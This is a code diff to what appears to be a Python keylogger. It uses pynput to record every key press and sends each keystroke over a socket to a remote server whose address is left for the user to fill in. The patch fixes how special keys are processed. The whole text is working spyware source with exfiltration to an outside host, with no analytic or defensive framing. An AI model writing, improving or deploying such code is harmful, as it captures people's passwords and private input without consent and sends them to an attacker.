@@ -1,6 +1,7 @@
 from pynput import keyboard
 from pathlib import Path
 import socket
+import re
 
 port = 12345
 address = "" #put the address of the server here
@@ -17,8 +18,7 @@ def on_key_press(key):
             s.send(bytes(key.char, "utf-8"))  # Print the key pressed
             s.send(bytes(" " , "utf-8"))
     except AttributeError:
-        k = str(key)
-        k.remove ("Key.")
+        k = re.sub("Key.", "", str(key))
         s.send(bytes(k, "utf-8"))  # Print special keys
         s.send(bytes(" ", "utf-8"))
         
